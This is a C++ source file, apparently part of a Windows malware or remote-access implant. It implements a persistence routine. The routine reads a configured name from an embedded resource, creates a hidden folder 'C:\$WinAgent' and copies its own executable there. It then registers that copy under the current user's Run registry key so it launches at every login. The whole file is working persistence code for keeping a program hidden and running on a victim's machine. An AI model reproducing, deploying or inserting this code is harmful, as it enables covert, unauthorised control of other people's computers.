#include "persist.h"

void copyExe(const std::string& generatedName);
void regStartupKey(const std::string& generatedName);

void persist()
{
    HRSRC persistenceResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PERSISTENCE1), L"persistence");
    HGLOBAL persistenceResourceHandle = LoadResource(NULL, persistenceResource);
    char* persistence = (char*)LockResource(persistenceResourceHandle);
    FreeResource(persistenceResourceHandle);

    if (*persistence != '0') 
    {
        struct stat buffer;
        std::string path = "C:\\$WinAgent";

        if (stat(path.c_str(), &buffer) != 0)
        {
            copyExe(persistence);
            regStartupKey(persistence);
        }
    }
}

void copyExe(const std::string& generatedName)
{
    LPCWSTR newfolder = L"C:\\$WinAgent";
    char filename[MAX_PATH];
    std::string newLocation = std::string() + "C:\\$WinAgent\\" + generatedName + ".exe";
    CreateDirectory(newfolder, NULL);
    SetFileAttributes(newfolder, FILE_ATTRIBUTE_HIDDEN);
    BOOL stats = 0;
    GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFileA(filename, newLocation.c_str(), stats);
}

void regStartupKey(const std::string& generatedName)
{
    std::wstring wRegName(generatedName.begin(), generatedName.end());
    std::wstring progPath = std::wstring() + L"C:\\$WinAgent\\" + wRegName + L".exe";
    HKEY hkey = NULL;
    RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    RegSetValueEx(hkey, wRegName.c_str(), 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hkey);
}
